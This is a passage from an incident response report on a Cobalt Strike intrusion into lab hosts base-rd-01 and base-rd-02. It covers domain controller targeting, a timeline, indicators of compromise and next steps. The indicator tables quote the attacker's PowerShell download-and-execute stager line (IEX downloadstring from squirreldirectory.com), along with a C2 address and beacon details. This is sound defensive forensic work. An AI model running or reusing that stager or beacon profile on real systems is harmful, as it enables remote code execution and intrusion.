|---------|-----------|-----------|
| 8f7cba50-022152/154 | 11:51:52Z | 022170 (11:55Z) |
| 8f7cba50-022181/183 | 12:02:23Z | 022206 (12:11Z) |
| 8f7cba50-022215/217 | 12:17:51Z | 022244 (12:35Z) |
| 8f7cba50-022251/253 | 13:08:13Z | 022276 (13:28Z) |
| 8f7cba50-022319/321/322 | 13:43:51Z | 022330 (13:48Z) |
| 8f7cba50-022335/337/338 | 14:04:24Z | 022366 (15:03Z) |
| 8f7cba50-022407/409 | 18:26:06Z | 022432 (18:45Z) |

---

### 4.13 Domain Controller Targeting (2018-09-05T12:01–12:16Z)

**base-rd-01 | Medium / Low**

During the Sep 5 RDP session at 12:02Z, two events indicate active targeting of the Domain Controller:

#### Shadow Copy enumeration

**Hit:** `8f7cba50-022177` — "Suspicious Get-WmiObject" — Low  
**Timestamp:** 2018-09-05T12:01:36Z  
**ScriptBlockText:** `Get-WmiObject Win32_ShadowCopy -ComputerName BASE-DC`

The actor queried all Volume Shadow Copies on the Domain Controller from within an active PS session on rd-01. Enumerating VSS is a standard pre-ransomware step to identify backups for deletion, as well as a technique to access locked NTDS.dit via shadow copy without triggering VSS-aware AV.

#### Explicit credential logons to base-dc

| Hit ID | Timestamp | Target | Target IP |
|--------|-----------|--------|-----------|
| 8f7cba50-022208 | 2018-09-05T12:14:36Z | base-dc.shieldbase.lan | 172.16.4.4 |
| 8f7cba50-022209 | 2018-09-05T12:14:36Z | base-dc | 172.16.4.4 |
| 8f7cba50-022210 | 2018-09-05T12:14:50Z | base-dc.shieldbase.lan | 172.16.4.4 |
| 8f7cba50-022211 | 2018-09-05T12:14:50Z | base-dc | 172.16.4.4 |
| 8f7cba50-022212 | 2018-09-05T12:16:49Z | base-dc.shieldbase.lan | 172.16.4.4 |
| 8f7cba50-022213 | 2018-09-05T12:16:49Z | base-dc | 172.16.4.4 |

All six: `SubjectUserName: spsql`, LogonType 9 (NewCredentials). Three distinct authentication attempts in two minutes, each paired, is consistent with credential prompts or repeated connection attempts to the DC.

The combination of VSS enumeration and explicit credential logons to the DC — from the same operator RDP session — represents the most significant risk event in the evidence set. DC compromise, NTDS.dit extraction, and ransomware-style backup destruction all become feasible at this stage.

---

### 4.14 SMB Beacon Deployment & HTTP C2 Refresh (2018-09-06–07)

**base-rd-02 and base-rd-01 | Critical**

Nine days after initial beacon deployment, the actor re-staged C2 channels on both hosts using two different beacon types.

#### SMB named-pipe beacon — rd-02 (2018-09-06T17:10–17:13Z)

| Hit ID | Sev | EID | Timestamp | Rule |
|--------|-----|-----|-----------|------|
| 8f7cba50-022770 | high | 4104 | 17:10:54Z | PowerShell ShellCode |
| 8f7cba50-022776 | high | 4104 | 17:10:57Z | PowerShell ShellCode |
| 8f7cba50-022786 | **crit** | 4103 | 17:13:36Z | Bad Opsec Powershell Code Artifacts |

The EID 4103 payload (`022786`) contains the reflective loader. Base64 shellcode block decoded to 370 bytes contains the plaintext string `\\.\pipe\diagsvc-22` — a Cobalt Strike SMB beacon communicating via named pipe rather than TCP. SMB beacons are invisible to standard HTTP/DNS network monitoring and lateral-movement-aware NDR tools that only watch for unusual network connections.

#### HTTP beacon refresh — rd-01 (2018-09-06T20:25–20:31Z)

| Hit ID | Sev | EID | Timestamp | Rule |
|--------|-----|-----|-----------|------|
| 8f7cba50-022965 | **crit** | 4103 | 20:25:17Z | Bad Opsec Powershell Code Artifacts |

Decoded shellcode contains `206.189.69.35` and the IE9 User-Agent — the same HTTP beacon profile as Aug 30 (`019876`), confirming this is a refresh of the original C2 channel.

Follow-on PS hits (20:30–20:31Z): `8f7cba50-022981`, `022983`, `022985–022987`, `022991`, `022993–022995`, `023000`, `023007`, `023009`, `023011–023013`, `023017`, `023019–023021`, `023026`

#### SMB beacon re-staged + HTTP stager — rd-02 (2018-09-07T04:19–04:24Z)

| Hit ID | Sev | EID | Timestamp | Rule |
|--------|-----|-----|-----------|------|
| 8f7cba50-023210 | **crit** | 4103 | 04:19:01Z | Bad Opsec Powershell Code Artifacts |

Decoded shellcode again contains `\\.\pipe\diagsvc-22` — the SMB beacon refreshed a second time on rd-02.

Five minutes later, a new PS cluster fires with the `squirreldirectory.com/a` stager URL present in ScriptBlockText, delivering updated reflective loader bytes:

`8f7cba50-023224`, `023226`, `023228–023230`, `023234`, `023236–023238`, `023243`, `023250`, `023252`, `023254–023256`, `023260`, `023262–023264`, `023269`

Hit `8f7cba50-023269` (EID 4104, PowerShell ShellCode, 04:24:57Z) is the last confirmed malicious event in the evidence set. The actor was actively maintaining dual C2 channels at the time of image collection.

---

## 5. Attack Timeline

```
UTC Timestamp            Host(s)       Event
──────────────────────── ────────────  ─────────────────────────────────────────────────────────────
2018-05-04T22:14:29Z     rd-01, rd-02  Security + System logs wiped (pre-domain name, "win10-test")
2018-05-07T19:24:23Z     rd-02         Defender disabled (wave 1, EID 5010)
2018-05-07T19:24:25Z     rd-01         Defender disabled (+2 sec)
2018-05-09T14:47:57Z     rd-02         Defender fully disabled — virus+threat+PUA (wave 2)
2018-05-09T14:48:01Z     rd-01         Defender fully disabled (+4 sec)
2018-05-09T14:49:50Z     rd-02         Defender re-disabled (persistence confirmation)
2018-05-09T14:49:52Z     rd-01         Defender re-disabled
2018-05-30T02:40:53Z     rd-02         Daily Defender re-disable begins (scheduled task suspected)
2018-05-31T02:30:46Z     rd-02         Daily re-disable
2018-06-01T02:42:01Z     rd-02         Daily re-disable (last observed in logs)
2018-07-11T05:42:20Z     rd-01         tdungan RDP session #1 from 192.168.30.10
  [...]
2018-07-18T15:07:49Z     rd-01         tdungan EID 4624 logon confirmed (192.168.30.10)
2018-07-26T03:43:59Z     rd-01         tdungan EID 4624 logon confirmed — off-hours (192.168.30.10)
2018-08-02T03:19:38Z     rd-01         tdungan final RDP session
2018-08-28T00:57:32Z     rd-01         CS beacon #1: 56e3de4 / 8f14386.exe (spsql, LocalSystem)
2018-08-28T01:05:03Z     rd-01         CS beacon #2: 9c3ae67 / e75f2c4.exe
2018-08-28T01:09:03Z     rd-01         CS beacon #3: 24f8f7e / 3795920.exe
2018-08-28T15:42:38Z     rd-01         squirreldirectory.com/a stager (EID 4104 ScriptBlock)
2018-08-28T21:39:08Z     rd-01         spsql RDP from 172.16.6.14 (base-rd-04)
2018-08-28T22:08:24Z     rd-01→        spsql explicit cred logon: base-file (172.16.4.5)
2018-08-28T22:16:14Z     rd-01→        spsql explicit cred logon: rd-02, rd-03, rd-04, rd-05, rd-06
2018-08-28T22:43:59Z     rd-01→        spsql explicit cred logon: base-av (172.16.5.20)
2018-08-30T13:51:28Z     rd-01         Reflective loader shellcode (EID 4103); C2: 206.189.69.35
2018-08-30T16:42:44Z     rd-01         CS beacon #4: fb9f33e / 35da1b7.exe (spsql)
2018-08-30T18:31:09Z     rd-01         Nishang PS commandlets — interactive shell (burst 1)
2018-08-30T21:40:21Z     rd-01         Nishang PS commandlets — interactive shell (burst 2)
2018-08-30T22:33:25Z     rd-01→        spsql lateral move: wkstn-03, 04, 05, 06, 01 (EID 4648)
2018-08-30T22:38:02Z     rd-01→        spsql lateral move: wkstn-01 through 06 (second wave)
2018-08-30T22:45:25Z     rd-01         Overpass-the-Hash — spsql Kerberos TGT (EID 4624 LogonType 9)
2018-08-30T22:45:29Z     rd-01→        spsql lateral move: wkstn-03 (post-OPtH)
2018-08-31T00:06:58Z     rd-01→        spsql lateral move: wkstn-02 (EID 4648)
2018-08-31T00:08:48Z     rd-01→        spsql explicit cred logon: rd-02 (beacon stager delivery)
2018-08-31T00:09:13Z     rd-02         CS beacon: df0398a / 5b1b72b.exe (spsql)
2018-08-31T00:09:43Z     rd-02         CS PS-encoded beacon: 8556ce1
2018-08-31T00:17:04Z     rd-02         spsql RDP from rd-01 (172.16.6.11)
2018-08-31T00:21:59Z     rd-02         Nishang PS commandlets — interactive shell
2018-08-31T00:44:08Z     rd-02         Nishang PS commandlets (burst 3)
2018-08-31T00:50:41Z     rd-01→        spsql lateral move: wkstn-05, rd-05 (continued spread)
2018-08-31T14:52:13Z     rd-01         spsql RDP from 172.16.6.14 (Aug 31 daytime, 4 sessions)
2018-09-05T11:51:52Z     rd-01         spsql RDP from 172.16.6.14 (8 sessions, 11:51–18:45Z)
2018-09-05T12:01:36Z     rd-01         Get-WmiObject Win32_ShadowCopy -ComputerName BASE-DC
2018-09-05T12:14:36Z     rd-01→        spsql explicit cred logon: base-dc (172.16.4.4) × 6 hits
2018-09-06T17:10:54Z     rd-02         PS shellcode (SMB beacon stager)
2018-09-06T17:13:36Z     rd-02         Reflective loader; shellcode = \\.\pipe\diagsvc-22 (SMB CS beacon)
2018-09-06T20:25:17Z     rd-01         Reflective loader; shellcode = 206.189.69.35 (HTTP beacon refresh)
2018-09-07T04:19:01Z     rd-02         SMB pipe beacon re-staged (\\.\pipe\diagsvc-22)
2018-09-07T04:24:57Z     rd-02         squirreldirectory.com/a stager + shellcode (LAST CONFIRMED EVENT)
```

---

## 6. Indicators of Compromise

### 6.1 Accounts

| Account | Role | SID | First Seen |
|---------|------|-----|-----------|
| `shieldbase\tdungan` | Initial access (RDP recon) | Not extracted from these images | 2018-07-11 |
| `shieldbase\spsql` | Primary operator | S-1-5-21-3445421715-2530590580-3149308974-1193 | 2018-08-28 |

### 6.2 Network IOCs

| Indicator | Type | Context |
|-----------|------|---------|
| `squirreldirectory.com` | Domain | HTTP C2 stager host |
| `http://squirreldirectory.com/a` | URL | IEX stager (confirmed in EID 4104 ScriptBlockText) |
| `206.189.69.35` | IP | HTTP CS beacon C2 (confirmed in decoded shellcode bytes, hits 019876 + 022965) |
| `192.168.30.10` | IP | tdungan RDP source (unidentified host) |
| `172.16.6.14` | IP | base-rd-04 — spsql operator RDP source |

### 6.3 Cobalt Strike Service Installs

| Service Name | Binary / Type | Host | Timestamp |
|-------------|--------------|------|-----------|
| 56e3de4 | `\ADMIN$\8f14386.exe` | rd-01 | 2018-08-28T00:57Z |
| 9c3ae67 | `\ADMIN$\e75f2c4.exe` | rd-01 | 2018-08-28T01:05Z |
| 24f8f7e | `\ADMIN$\3795920.exe` | rd-01 | 2018-08-28T01:09Z |
| fb9f33e | `\ADMIN$\35da1b7.exe` | rd-01 | 2018-08-30T16:42Z |
| df0398a | `\ADMIN$\5b1b72b.exe` | rd-02 | 2018-08-31T00:09Z |
| 8556ce1 | PS-encoded (no binary) | rd-02 | 2018-08-31T00:09Z |

All deployed via `\\127.0.0.1\ADMIN$`, demand-start, LocalSystem.

### 6.4 Named Pipe

| Indicator | Context |
|-----------|---------|
| `\\.\pipe\diagsvc-22` | CS SMB beacon; confirmed in decoded shellcode bytes from hits 022786 + 023210 |

### 6.5 Shellcode Beacon Profile

| Attribute | Value |
|-----------|-------|
| Loader pattern | `func_get_proc_address` + `VirtualAlloc` + copy + execute (PS reflective DLL injection) |
| Execution wrapper | `start-job { IEX $a } -RunAs32` (32-bit in 64-bit host) |
| User-Agent | `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MATP; MATP)` |
| Stager command | `IEX ((new-object net.webclient).downloadstring('http://squirreldirectory.com/a'))` |

### 6.6 Lateral Movement Targets (EID 4648, sourced from rd-01)

| Target | IP | First Seen |
|--------|-----|-----------|
| base-file.shieldbase.lan | 172.16.4.5 | 2018-08-28T22:08Z |
| base-rd-02 through 06 | 172.16.6.12–16 | 2018-08-28T22:16Z |
| base-av.shieldbase.lan | 172.16.5.20 | 2018-08-28T22:43Z |
| base-wkstn-01 through 06 | 172.16.7.11–16 | 2018-08-30T22:33Z |
| base-dc.shieldbase.lan | 172.16.4.4 | 2018-09-05T12:14Z |

---

## 7. Gaps & Recommended Next Steps

### 7.1 Evidence Gaps

| Gap | Risk |
|-----|------|
| `base-dc` not imaged / not in this hunt | DC compromise status unknown; VSS enumeration and explicit credential logons represent unresolved DC access |
| `base-rd-04` (172.16.6.14) not in evidence | This is spsql's operator host; it likely holds PS history, prefetch, credential stores, and outbound RDP records |
| Only base-rd-01/02 in this hunt | Workstations, file server, AV host, and rd-03/05/06 were all targeted per EID 4648 but have not been hunted |
| Evidence collection date unknown | Last event is 2018-09-07T04:24Z; if collection was later, operator activity may continue beyond the log window |
| `tdungan` source host (192.168.30.10) unknown | Initial access vector and credential compromise path for tdungan are unresolved |
| Scheduled task for Defender re-disable on rd-02 | No registry or scheduled task EVTX evidence yet analysed; persistence mechanism unconfirmed |

### 7.2 Recommended Next Steps (Priority Order)

**P0 — Immediate:**

1. **Image base-dc** — Check EID 4624 (LogonType 3/9/10), 4768/4769 (Kerberos TGT/service tickets for spsql), 4732/4728 (group membership changes), and VSS audit events in the Sep 5 window. Determine if DC was compromised, NTDS.dit extracted, or group membership altered.

2. **Image base-rd-04 (172.16.6.14)** — spsql's operator workstation. PS history, EVTX RDP outbound records, prefetch, and MUICache will reveal the full operator toolset and potential credential storage.

**P1 — Within 48 hours:**

3. **Extract CS beacon configs** — Carve the six beacon binaries from the EVTX ADMIN$ paths (`8f14386.exe`, `e75f2c4.exe`, `3795920.exe`, `35da1b7.exe`, `5b1b72b.exe`) using `icat` against each E01, then run `1768.py` or equivalent to extract full beacon configuration (sleep jitter, C2 URIs, killdate, watermark).

4. **Scheduled task analysis on rd-02** — Extract the SYSTEM and SOFTWARE registry hives using `icat` and run RECmd to identify the task or Run key re-disabling Defender at ~02:30–02:42 UTC.

5. **Hunt base-file, base-av, base-wkstn-01, base-wkstn-05** — All were targeted via EID 4648. Run 8f7cba50-equivalent hunt on available images. The workstation images in evidence (wkstn-01, wkstn-05) should be hunted immediately.

**P2 — Investigation:**

6. **Identify 192.168.30.10** — Cross-reference with DHCP logs on base-dc, AD computer objects, and any network flow data. This resolves the initial access vector.

7. **Scope the OPtH material** — Search for EID 4624 LogonType 9 across all available images to determine how broadly the stolen Kerberos material was used beyond what rd-01's EID 4648 log records show.

---

## 8. Evidence Integrity

| Item | Value |
|------|-------|
| Hunt job ID | 8f7cba50 |
| Results file | /cases/FINDEVIL/analysis/8f7cba50/hunt_results.json |
| File size | 68,786,416 bytes |
| SHA-256 | d2ce7c8a717a095306475c7c7ea8781cb612cd096cd4fa76bf050a0e27068cfc |
| Total hits in source | 23,306 |
| Rules fired | 80 |
| Chainsaw version | 2.16.0 |
| Evidence images | /cases/FINDEVIL/base-rd-01-cdrive.E01, /cases/FINDEVIL/base-rd-02-cdrive.E01 |
| Evidence access | Read-only throughout |
| Hit ID map | /cases/FINDEVIL/reports/rd_hosts_hunt_hitmap_8f7cba50.md |

### Source Verification

All findings in this report are sourced exclusively from hunt job `8f7cba50`. No data from any other hunt job is included.

Hit ID verification performed against source JSON:
- All 219 hit IDs in the detailed mapping verified to exist in `hunt_results.json` (0 missing)
- Rule names, EIDs, severities, and host paths verified for a cross-section of 14 hits (14/14 correct after correcting host attribution method for pre-domain-join hits)
- Shellcode strings (`206.189.69.35`, `\\.\pipe\diagsvc-22`) verified by base64-decoding shellcode bytes from hits `019876`, `022786`, `022965`, `023210` — not from Chainsaw text extraction fields
- `squirreldirectory.com/a` URL verified directly in EID 4104 ScriptBlockText (hits `019132` et al — 47 hits total)
- Lateral movement targets (base-file, workstations, base-dc) verified from `TargetServerName` field of EID 4648 events in hits `019319`, `020089–020099`, `022208–022213` et al — all sourced from job 8f7cba50

---

*End of report. All conclusions grounded in source EVTX data from the named evidence images. No findings from other hunt jobs are included.*
